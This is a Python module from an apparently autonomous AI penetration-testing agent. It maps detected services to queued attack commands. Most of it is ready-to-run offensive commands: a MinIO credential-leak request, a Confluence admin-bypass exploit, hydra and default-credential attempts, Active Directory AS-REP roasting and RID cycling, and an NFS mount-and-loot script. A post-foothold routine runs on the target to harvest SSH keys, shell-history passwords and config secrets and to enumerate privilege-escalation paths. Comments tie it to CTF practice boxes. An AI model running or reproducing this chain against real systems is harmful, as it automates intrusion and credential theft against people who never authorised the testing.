"""
agents/finding_triggers.py — findings-driven action triggers.

Why this exists
===============
The old subagent dispatcher ran a FIXED set of subagents per phase,
regardless of what was actually found.  Recon always ran
network_scan + dns_recon + service_banner + 2× web_fingerprint —
even when the target turned out to be an obscure service that none
of those subagents understood.

A real pentester adapts based on what they see.  When `nmap` reports
``54321/tcp open Golang net/http server`` with response body containing
``"minio"``, the operator immediately tries the MinIO CVE-2023-28432
bootstrap-verify endpoint.  When they see ``WordPress 6.x``, they run
wpscan.  When they see ``Tomcat /manager``, they try default creds.

This module is the declarative layer that encodes those reactions.
Patterns matched against intel → actions queued onto the engagement.

Two action types are supported:
  1. ``command`` — a shell command (added to intel["next_commands"]
     for the exploit-phase first-strike loop to consume).
  2. ``subagent`` — a subagent name to dispatch with target+intel.

The trigger registry is intentionally OPEN: anyone can register a new
trigger.  The default set below covers the 30 most common
attack-surface→action mappings.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional


# ─────────────────────────────────────────────────────────────────────
#  Trigger definition
# ─────────────────────────────────────────────────────────────────────


@dataclass
class TriggerAction:
    """One concrete action a trigger may emit."""
    kind:       str                # "command" | "subagent" | "insight"
    payload:    str                # shell command, subagent name, or insight text
    priority:   int    = 5         # 0 (low) ... 10 (must-do)
    rationale:  str    = ""        # why this action — fed into LLM prompt
    cves:       List[str] = field(default_factory=list)


@dataclass
class Trigger:
    """A declarative "if condition matches, queue these actions" rule.

    Conditions are evaluated against the engagement context.
    """
    name:    str
    when:    Callable[["EngagementContext"], bool]
    actions: List[TriggerAction]
    once:    bool = True           # fire at most once per engagement


# ─────────────────────────────────────────────────────────────────────
#  Predicate helpers
# ─────────────────────────────────────────────────────────────────────


def _service_matches(ctx, *, port: Optional[int] = None,
                     product_re: Optional[str] = None,
                     banner_re: Optional[str] = None) -> bool:
    """Return True if any discovered service matches the filters.

    ``services`` is {port: {service, version, product, banner, ...}}.
    """
    services = ctx.services
    if not services:
        return False
    for p, svc in services.items():
        if not isinstance(svc, dict):
            continue
        if port is not None and int(p) != int(port):
            continue
        haystack = " ".join(str(svc.get(k, "")) for k in
                            ("service", "product", "version", "banner",
                              "extrainfo", "info")).lower()
        if product_re and not re.search(product_re, haystack, re.IGNORECASE):
            continue
        if banner_re and not re.search(banner_re, haystack, re.IGNORECASE):
            continue
        return True
    return False


def _port_open(ctx, port: int) -> bool:
    ports = ctx.open_ports or []
    return any(int(p) == int(port) for p in ports if str(p).isdigit())


def _intel_has(ctx, key: str) -> bool:
    return bool(ctx.intel.get(key))


def _target_host(ctx) -> str:
    """Extract a hostname / IP we can interpolate into commands."""
    return (ctx.intel.get("target_host") or
            ctx.intel.get("target_url") or
            ctx.target or "TARGET")


# ─────────────────────────────────────────────────────────────────────
#  Default trigger registry
# ─────────────────────────────────────────────────────────────────────


def _build_default_triggers() -> List[Trigger]:
    """The 30+ common attack-surface→action mappings.

    Each `when` is closure-captured so adding new triggers requires
    only appending a Trigger() row.  Patterns are tuned conservatively:
    fire on STRONG positive matches, not on guesses.
    """
    triggers: List[Trigger] = []
    T = TriggerAction          # alias for brevity

    # ── MinIO — the kill chain from your failed run ──
    triggers.append(Trigger(
        name="minio_bootstrap_verify",
        when=lambda ctx: _service_matches(ctx, banner_re=r"minio"),
        actions=[
            T(kind="command", priority=10,
              payload="curl -sk -X POST http://{host}/minio/bootstrap/v1/verify",
              rationale="MinIO CVE-2023-28432 — unauthenticated info disclosure leaks MINIO_ROOT_USER/PASSWORD",
              cves=["CVE-2023-28432"]),
            T(kind="insight", priority=9, payload="MinIO instance detected — CVE-2023-28432 is a trivial first-strike. Bootstrap-verify endpoint commonly leaks admin credentials."),
        ],
    ))

    # ── WordPress ──
    triggers.append(Trigger(
        name="wordpress_full_enum",
        when=lambda ctx: _service_matches(ctx, banner_re=r"wordpress|wp-content|wp-login"),
        actions=[
            T(kind="command", priority=8,
              payload="wpscan --url http://{host} --enumerate u,p,t --random-user-agent",
              rationale="WordPress detected — enumerate users, plugins, themes for known-vuln chains"),
        ],
    ))

    # ── Tomcat /manager ──
    triggers.append(Trigger(
        name="tomcat_manager_default_creds",
        when=lambda ctx: _service_matches(ctx, banner_re=r"tomcat|coyote"),
        actions=[
            T(kind="command", priority=8,
              payload="hydra -L /usr/share/seclists/Usernames/Common-Credentials/best110.txt "
                       "-P /usr/share/seclists/Passwords/Common-Credentials/best110.txt "
                       "{host} http-get /manager/html",
              rationale="Tomcat detected — test default creds (tomcat:tomcat, admin:admin) on /manager/html"),
            T(kind="command", priority=7,
              payload="curl -sk http://{host}/manager/html -I",
              rationale="Check /manager/html accessibility (common default-cred chain to JSP RCE)"),
        ],
    ))

    # ── Jenkins ──
    triggers.append(Trigger(
        name="jenkins_script_console",
        when=lambda ctx: _service_matches(ctx, banner_re=r"jenkins"),
        actions=[
            T(kind="command", priority=9,
              payload="curl -sk http://{host}/script -I",
              rationale="Jenkins detected — /script console can yield Groovy RCE if unauthenticated"),
            T(kind="command", priority=8,
              payload="curl -sk http://{host}/asynchPeople/api/json",
              rationale="Jenkins user enumeration via asynchPeople endpoint"),
        ],
    ))

    # ── Confluence ──
    triggers.append(Trigger(
        name="confluence_cve_chain",
        when=lambda ctx: _service_matches(ctx, banner_re=r"confluence|atlassian"),
        actions=[
            T(kind="insight", priority=10, payload="Confluence detected — check CVE-2023-22515 (broken access control, admin creation) and CVE-2022-26134 (OGNL RCE)"),
            T(kind="command", priority=9,
              payload="curl -sk -X POST http://{host}/server-info.action --data 'bootstrapStatusProvider.applicationConfig.setupComplete=false'",
              rationale="CVE-2023-22515 probe — bypass admin-creation lockout",
              cves=["CVE-2023-22515"]),
        ],
    ))

    # ── GitLab ──
    triggers.append(Trigger(
        name="gitlab_recon",
        when=lambda ctx: _service_matches(ctx, banner_re=r"gitlab"),
        actions=[
            T(kind="command", priority=8,
              payload="curl -sk http://{host}/explore/projects",
              rationale="GitLab detected — check public projects + version-specific CVEs"),
            T(kind="command", priority=7,
              payload="curl -sk http://{host}/api/v4/projects?per_page=100",
              rationale="GitLab API project enumeration"),
        ],
    ))

    # ── SMB ──
    triggers.append(Trigger(
        name="smb_full_enum",
        when=lambda ctx: _service_matches(ctx, port=445) or _port_open(ctx, 445),
        actions=[
            T(kind="command", priority=8,
              payload="enum4linux-ng -A {host}",
              rationale="SMB/445 open — enum4linux-ng for shares, users, groups, OS info"),
            T(kind="command", priority=8,
              payload="smbclient -L //{host}/ -N",
              rationale="Anonymous SMB share listing"),
            T(kind="command", priority=7,
              payload="crackmapexec smb {host} --shares -u '' -p ''",
              rationale="Null-session share enumeration via crackmapexec"),
        ],
    ))

    # ── LDAP (often Domain Controllers) ──
    triggers.append(Trigger(
        name="ldap_anon_bind",
        when=lambda ctx: _service_matches(ctx, port=389) or _port_open(ctx, 389),
        actions=[
            T(kind="command", priority=8,
              payload="ldapsearch -x -h {host} -s base -b '' '(objectclass=*)' '*' '+'",
              rationale="LDAP/389 open — anonymous RootDSE query for naming contexts + supported SASL mechanisms"),
        ],
    ))

    # ── Kerberos (DC indicator) ──
    triggers.append(Trigger(
        name="kerberos_dc_attacks",
        when=lambda ctx: _port_open(ctx, 88) or _service_matches(ctx, port=88),
        actions=[
            T(kind="insight", priority=9, payload="Kerberos/88 open — likely Active Directory DC. AS-REP roastable users + Kerberoastable SPNs are the high-value first targets."),
            T(kind="subagent", priority=9, payload="lateral.ad_recon",
              rationale="Dispatch AD recon subagent: kerbrute userenum, GetNPUsers AS-REP roast, BloodHound collection"),
        ],
    ))

    # ── AD DC FULL CHAIN (the missing piece from the support.htb engagement) ──
    # When kerberos + LDAP + SMB are all open, this is an AD Domain
    # Controller and the canonical attack path is well-defined.
    # Queue the FULL chain (not just insights) so the exploit phase
    # has concrete commands to execute.  The {domain} placeholder is
    # interpolated from intel via _ad_domain() below.
    def _ad_chain_when(ctx):
        # Need at least kerberos + LDAP + SMB co-located
        return (_port_open(ctx, 88) and _port_open(ctx, 389)
                  and (_port_open(ctx, 445) or _port_open(ctx, 139)))

    triggers.append(Trigger(
        name="ad_dc_full_attack_chain",
        when=_ad_chain_when,
        actions=[
            T(kind="insight", priority=10,
              payload="AD DC detected (kerberos+ldap+smb).  Canonical chain: "
                       "(1) anon-LDAP user enumeration -> (2) AS-REP roast users "
                       "without preauth -> (3) crack hashes -> (4) Kerberoast "
                       "SPNs with creds -> (5) BloodHound mapping -> (6) "
                       "evil-winrm/wmiexec for shell.  THIS REPLACES WSTG."),
            # Step 1 — anonymous LDAP user enumeration
            T(kind="command", priority=10,
              payload="ldapsearch -x -h {host} -s sub -b '{base_dn}' "
                       "'(objectClass=user)' sAMAccountName",
              rationale="Enumerate AD users via anonymous LDAP bind (works on this DC since anon bind is allowed per service_banner finding)"),
            # Step 2 — null-session SMB enum
            T(kind="command", priority=10,
              payload="crackmapexec smb {host} -u '' -p '' --shares",
              rationale="SMB null-session share enumeration"),
            T(kind="command", priority=9,
              payload="crackmapexec smb {host} -u guest -p '' --shares",
              rationale="Guest-account SMB share enumeration"),
            # Step 3 — RID cycling for further user discovery
            T(kind="command", priority=8,
              payload="impacket-lookupsid 'support.htb/anonymous'@{host}",
              rationale="Anonymous RID cycling — discovers usernames the LDAP enum may miss"),
            # Step 4 — AS-REP roast (DOES NOT need credentials)
            T(kind="command", priority=10,
              payload="impacket-GetNPUsers {domain}/ -dc-ip {host} "
                       "-no-pass -usersfile /usr/share/seclists/Usernames/"
                       "xato-net-10-million-usernames-dup.txt "
                       "-format hashcat -outputfile /tmp/asrep_{domain}.hash",
              rationale="AS-REP roast — accounts with DONT_REQ_PREAUTH bit "
                          "yield TGS hashes that hashcat can crack offline. "
                          "NO credentials required."),
            # Step 5 — BloodHound when any creds appear (gated by intel)
            T(kind="insight", priority=7,
              payload="Once ANY credentials are obtained, run: "
                       "`bloodhound-python -d {domain} -u <user> -p <pass> "
                       "-ns {host} -c All --zip` to map attack paths to DA"),
            # Step 6 — evil-winrm shell with creds (gated by intel)
            T(kind="insight", priority=8,
              payload="With creds, the shell is: "
                       "`evil-winrm -i {host} -u <user> -p <pass>`.  "
                       "WinRM/5985 is open on this DC."),
        ],
    ))

    # ── MSSQL ──
    triggers.append(Trigger(
        name="mssql_default_creds",
        when=lambda ctx: _port_open(ctx, 1433) or _service_matches(ctx, banner_re=r"microsoft sql server|mssql"),
        actions=[
            T(kind="command", priority=7,
              payload="crackmapexec mssql {host} -u sa -p '' --port 1433",
              rationale="MSSQL/1433 — test default sa account with blank password"),
            T(kind="command", priority=6,
              payload="impacket-mssqlclient -windows-auth Administrator@{host}",
              rationale="MSSQL with Windows auth probe"),
        ],
    ))

    # ── MySQL ──
    triggers.append(Trigger(
        name="mysql_default_creds",
        when=lambda ctx: _port_open(ctx, 3306) or _service_matches(ctx, banner_re=r"mysql|mariadb"),
        actions=[
            T(kind="command", priority=6,
              payload="mysql -h {host} -u root --password='' -e 'SELECT VERSION();'",
              rationale="MySQL/3306 — test passwordless root (common dev misconfig)"),
        ],
    ))

    # ── PostgreSQL ──
    triggers.append(Trigger(
        name="postgres_default_creds",
        when=lambda ctx: _port_open(ctx, 5432) or _service_matches(ctx, banner_re=r"postgresql"),
        actions=[
            T(kind="command", priority=6,
              payload="psql -h {host} -U postgres -c 'SELECT version();'",
              rationale="Postgres/5432 — test default postgres role with no password"),
        ],
    ))

    # ── Redis (often unauthenticated) ──
    triggers.append(Trigger(
        name="redis_unauth",
        when=lambda ctx: _port_open(ctx, 6379) or _service_matches(ctx, banner_re=r"redis"),
        actions=[
            T(kind="command", priority=9,
              payload="redis-cli -h {host} info",
              rationale="Redis/6379 — test unauthenticated access. If INFO works, SSH-key write to authorized_keys is the canonical chain"),
        ],
    ))

    # ── MongoDB (often unauthenticated) ──
    triggers.append(Trigger(
        name="mongodb_unauth",
        when=lambda ctx: _port_open(ctx, 27017) or _service_matches(ctx, banner_re=r"mongodb"),
        actions=[
            T(kind="command", priority=8,
              payload="mongo --host {host} --eval 'db.adminCommand({listDatabases: 1})'",
              rationale="MongoDB/27017 — test unauthenticated database listing"),
        ],
    ))

    # ── Elasticsearch (data exposure) ──
    triggers.append(Trigger(
        name="elasticsearch_unauth",
        when=lambda ctx: _port_open(ctx, 9200) or _service_matches(ctx, banner_re=r"elasticsearch"),
        actions=[
            T(kind="command", priority=8,
              payload="curl -sk http://{host}:9200/_cat/indices?v",
              rationale="Elasticsearch/9200 — list indices (often exposed without auth)"),
        ],
    ))

    # ── FTP anonymous ──
    triggers.append(Trigger(
        name="ftp_anon",
        when=lambda ctx: _port_open(ctx, 21) or _service_matches(ctx, banner_re=r"ftp"),
        actions=[
            T(kind="command", priority=6,
              payload="curl -sk ftp://anonymous:anonymous@{host}/",
              rationale="FTP/21 — anonymous login attempt"),
        ],
    ))

    # ── NFS — FULL EXPLOITATION CHAIN (not just enum) ──
    # Overpass-3 post-mortem: NFS/2049 was found but only `showmount`
    # was queued (and never even ran).  The real foothold is:
    # list exports → mount → harvest SSH keys / flags / backups →
    # use them.  This chain runs end-to-end.
    triggers.append(Trigger(
        name="nfs_full_exploit_chain",
        when=lambda ctx: _port_open(ctx, 2049) or _port_open(ctx, 111),
        actions=[
            T(kind="command", priority=10,
              payload="showmount -e {host}",
              rationale="NFS/2049 — list exports (step 1 of mount-and-loot chain)"),
            T(kind="command", priority=10,
              payload=(
                "bash -c 'mkdir -p /tmp/argus_nfs && "
                "for exp in $(showmount -e {host} 2>/dev/null | tail -n +2 | awk \"{{print \\$1}}\"); do "
                "mp=/tmp/argus_nfs/$(echo $exp | tr / _); mkdir -p $mp; "
                "mount -t nfs -o nolock {host}:$exp $mp 2>/dev/null && "
                "echo MOUNTED $exp at $mp; done; ls -laR /tmp/argus_nfs 2>/dev/null | head -100'"
              ),
              rationale="NFS — mount every export read-only and list contents (step 2)"),
            T(kind="command", priority=10,
              payload=(
                "bash -c 'find /tmp/argus_nfs -type f \\( "
                "-name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"*.pem\" "
                "-o -name \"user.txt\" -o -name \"root.txt\" -o -name \"*.kdbx\" "
                "-o -name \".bash_history\" -o -name \"*.bak\" -o -name \"*.sql\" "
                "-o -name \"*.conf\" -o -name \"authorized_keys\" \\) "
                "2>/dev/null | head -50'"
              ),
              rationale="NFS — hunt SSH keys / flags / backups in mounted exports (step 3 = LOOT)"),
            T(kind="insight", priority=10,
              payload=(
                "NFS exploitation: if exports are mountable, check for "
                "(a) SSH private keys → ssh in, (b) no_root_squash → write "
                "a SUID root binary, (c) flags/backups/credentials. This is "
                "a classic full-foothold-to-root path."
              )),
        ],
    ))

    # ── Werkzeug debug console (Python web apps) ──
    # Werkzeug's interactive debugger (when enabled) gives unauthenticated
    # RCE via /console.  Even when PIN-protected, the PIN is derivable.
    triggers.append(Trigger(
        name="werkzeug_debug_console",
        when=lambda ctx: _service_matches(ctx, banner_re=r"werkzeug|flask"),
        actions=[
            T(kind="command", priority=10,
              payload="curl -sk http://{host}:8080/console -o /dev/null -w 'console:%{http_code}\\n'",
              rationale="Werkzeug — probe /console for the interactive debugger (unauth RCE if 200)"),
            T(kind="command", priority=9,
              payload="curl -sk 'http://{host}:8080/?__debugger__=yes&cmd=resource&f=debugger.js' -o /dev/null -w 'debugger:%{http_code}\\n'",
              rationale="Werkzeug — confirm debugger is active via the __debugger__ resource endpoint"),
            T(kind="insight", priority=9,
              payload=(
                "Werkzeug detected — if /console returns 200 the debugger "
                "is on: RCE is immediate. If PIN-locked, derive it from "
                "/etc/machine-id + app module path (werkzeug PIN algorithm) "
                "after an LFI, or via the Docker shared machine-id bug "
                "(CVE-2019-14806)."
              )),
        ],
    ))

    # ── SNMP ──
    triggers.append(Trigger(
        name="snmp_default_community",
        when=lambda ctx: _port_open(ctx, 161),
        actions=[
            T(kind="command", priority=6,
              payload="snmpwalk -v2c -c public {host} 1.3.6.1.2.1.1",
              rationale="SNMP/161 — try 'public' community string (very common default)"),
        ],
    ))

    # ── Docker API ──
    triggers.append(Trigger(
        name="docker_api_exposed",
        when=lambda ctx: _port_open(ctx, 2375) or _port_open(ctx, 2376),
        actions=[
            T(kind="command", priority=10,
              payload="curl -sk http://{host}:2375/version",
              rationale="Docker API/2375 exposed — if reachable, container escape to host is trivial"),
        ],
    ))

    # ── Kubernetes API ──
    triggers.append(Trigger(
        name="k8s_api_anon",
        when=lambda ctx: _port_open(ctx, 6443) or _port_open(ctx, 8080),
        actions=[
            T(kind="command", priority=8,
              payload="curl -sk https://{host}:6443/api/v1/namespaces",
              rationale="K8s API server — test anonymous access to /api/v1"),
        ],
    ))

    # ── ActiveMQ ──
    triggers.append(Trigger(
        name="activemq_default",
        when=lambda ctx: _port_open(ctx, 8161) or _service_matches(ctx, banner_re=r"activemq"),
        actions=[
            T(kind="command", priority=8,
              payload="curl -sk -u admin:admin http://{host}:8161/admin/",
              rationale="ActiveMQ default creds — admin:admin on /admin (CVE-2023-46604 if version old)"),
        ],
    ))

    # ── Rsync ──
    triggers.append(Trigger(
        name="rsync_modules",
        when=lambda ctx: _port_open(ctx, 873),
        actions=[
            T(kind="command", priority=6,
              payload="rsync rsync://{host}/",
              rationale="Rsync/873 — list available modules (sometimes world-readable)"),
        ],
    ))

    # ── VNC ──
    triggers.append(Trigger(
        name="vnc_noauth",
        when=lambda ctx: _port_open(ctx, 5900) or _port_open(ctx, 5901),
        actions=[
            T(kind="command", priority=7,
              payload="nmap -p 5900 --script vnc-info,vnc-brute {host}",
              rationale="VNC/5900 — auth method check + brute (no-auth instances are surprisingly common)"),
        ],
    ))

    # ── RDP ──
    triggers.append(Trigger(
        name="rdp_recon",
        when=lambda ctx: _port_open(ctx, 3389),
        actions=[
            T(kind="command", priority=7,
              payload="nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info {host}",
              rationale="RDP/3389 — NLA check + NTLM info leak"),
        ],
    ))

    # ── DNS zone transfer ──
    triggers.append(Trigger(
        name="dns_zone_xfer",
        when=lambda ctx: _port_open(ctx, 53),
        actions=[
            T(kind="command", priority=7,
              payload="dig axfr @{host}",
              rationale="DNS/53 — attempt AXFR zone transfer (often misconfigured to allow it)"),
        ],
    ))

    # ── Default credentials cluster (catch-all for common defaults) ──
    triggers.append(Trigger(
        name="exposed_admin_panel_default_creds",
        when=lambda ctx: any(("admin" in (p or "").lower() or "login" in (p or "").lower())
                              for p in (ctx.intel.get("web_paths") or [])),
        actions=[
            T(kind="insight", priority=7, payload="Admin panel paths discovered — test default credentials (admin/admin, admin/password, root/root, administrator/password) BEFORE running brute-force"),
        ],
    ))

    # ══════════════════════════════════════════════════════════════
    #  LOOT + FLAG HUNTER — fires the moment a shell foothold exists
    # ══════════════════════════════════════════════════════════════
    # The user's directive: "if entry is successful... hunt for loot
    # or flags".  This trigger fires when intel.shell_access is True.
    # Every command runs THROUGH the active shell (shell_exec routing
    # in _dispatch_to_agent) so it executes on the TARGET, not the
    # operator host.  Covers the standard CTF + real-engagement loot
    # set: flags, SSH keys, credential files, sudo rights, history,
    # SUID binaries, and the canonical privesc enumeration.
    triggers.append(Trigger(
        name="loot_and_flag_hunter",
        when=lambda ctx: bool(ctx.intel.get("shell_access")),
        once=True,
        actions=[
            # ── Flags first (CTF objective) ──
            T(kind="command", priority=10,
              payload="shell_exec find / -type f \\( -name user.txt -o -name root.txt -o -name flag.txt -o -name proof.txt -o -name local.txt \\) 2>/dev/null",
              rationale="LOOT: locate CTF flags across the whole filesystem"),
            # ── Current context ──
            T(kind="command", priority=9,
              payload="shell_exec id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -3",
              rationale="LOOT: establish current user + host context for privesc"),
            # ── SSH keys + creds for lateral / persistence ──
            T(kind="command", priority=9,
              payload="shell_exec find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' -o -name '.netrc' 2>/dev/null | head -20",
              rationale="LOOT: SSH private keys + credential files for lateral movement"),
            T(kind="command", priority=8,
              payload="shell_exec cat ~/.bash_history /home/*/.bash_history 2>/dev/null | grep -iE 'pass|ssh|mysql|sudo|curl|wget|token|key' | head -40",
              rationale="LOOT: shell history often contains plaintext credentials"),
            # ── Credential files / app configs ──
            T(kind="command", priority=8,
              payload="shell_exec grep -rIl --include='*.conf' --include='*.env' --include='*.ini' --include='*.yaml' --include='*.php' -iE 'password|secret|api_key|token' /var/www /opt /home /etc 2>/dev/null | head -30",
              rationale="LOOT: hunt embedded credentials in app config files"),
            # ── Privilege escalation surface ──
            T(kind="command", priority=9,
              payload="shell_exec sudo -n -l 2>/dev/null; echo '---'; find / -perm -4000 -type f 2>/dev/null | head -40",
              rationale="PRIVESC: sudo rights (NOPASSWD) + SUID binaries — the two fastest root paths"),
            T(kind="command", priority=7,
              payload="shell_exec cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null",
              rationale="PRIVESC: writable cron jobs are a common root vector"),
            T(kind="insight", priority=10,
              payload=(
                "SHELL OBTAINED — loot+privesc hunt dispatched.  Priorities: "
                "(1) capture user.txt/root.txt, (2) harvest SSH keys + creds "
                "for lateral movement, (3) escalate via sudo NOPASSWD / SUID "
                "/ writable cron / kernel exploit.  Re-run linpeas if no "
                "quick win surfaces."
              )),
        ],
    ))

    return triggers


# Singleton registry — extend at module import time if needed
_TRIGGERS: List[Trigger] = _build_default_triggers()
_FIRED: Dict[str, bool] = {}


def register_trigger(trigger: Trigger) -> None:
    """Append a new trigger (for plugins / per-engagement extensions)."""
    _TRIGGERS.append(trigger)


def evaluate_triggers(ctx) -> List[TriggerAction]:
    """Walk every registered trigger; return a list of TriggerActions
    whose conditions evaluated True (and have not yet fired if once=True).

    Side effect: ``_FIRED`` marks once-only triggers as consumed.  The
    caller is expected to convert TriggerActions into next_commands /
    pinned insights / subagent dispatches as appropriate.

    The session_id is used as the fire-key so multiple parallel sessions
    don't interfere with each other.
    """
    out: List[TriggerAction] = []
    sid = getattr(ctx, "session_id", "default")
    # Pull AD-related placeholders from intel ONCE so every command in
    # this evaluation pass uses the same domain/base_dn (avoids races
    # with concurrent OSINT updates).
    domain = ""
    try:
        domain = ctx.extract_ad_domain() if hasattr(ctx, "extract_ad_domain") else ""
    except Exception:
        domain = ""
    if not domain:
        domain = (ctx.intel.get("ad_domain", "") or "").lower()
    base_dn = ""
    if domain:
        base_dn = ",".join(f"DC={p}" for p in domain.split("."))
    for t in _TRIGGERS:
        fire_key = f"{sid}::{t.name}"
        if t.once and _FIRED.get(fire_key):
            continue
        try:
            if not t.when(ctx):
                continue
        except Exception:
            continue
        host = _target_host(ctx)
        for raw in t.actions:
            # Interpolate placeholders in BOTH command and insight payloads
            # (insights also reference the domain for the operator).
            payload = raw.payload
            payload = payload.replace("{host}", host)
            if domain:
                payload = payload.replace("{domain}", domain)
            if base_dn:
                payload = payload.replace("{base_dn}", base_dn)
            # If the trigger requires a domain but none is known, skip
            # commands that still contain unfilled placeholders (insight
            # actions are still emitted — they're informational).
            if raw.kind == "command" and ("{domain}" in payload or "{base_dn}" in payload):
                continue
            out.append(TriggerAction(
                kind=raw.kind, payload=payload,
                priority=raw.priority, rationale=raw.rationale,
                cves=list(raw.cves),
            ))
        if t.once:
            _FIRED[fire_key] = True
    # Sort by priority descending (most important first)
    out.sort(key=lambda a: a.priority, reverse=True)
    return out


def reset_fired(session_id: str = "") -> None:
    """Clear the fired-trigger memory for a given session (or all)."""
    if not session_id:
        _FIRED.clear()
        return
    for k in [k for k in _FIRED if k.startswith(f"{session_id}::")]:
        del _FIRED[k]


__all__ = ["Trigger", "TriggerAction", "register_trigger",
            "evaluate_triggers", "reset_fired"]
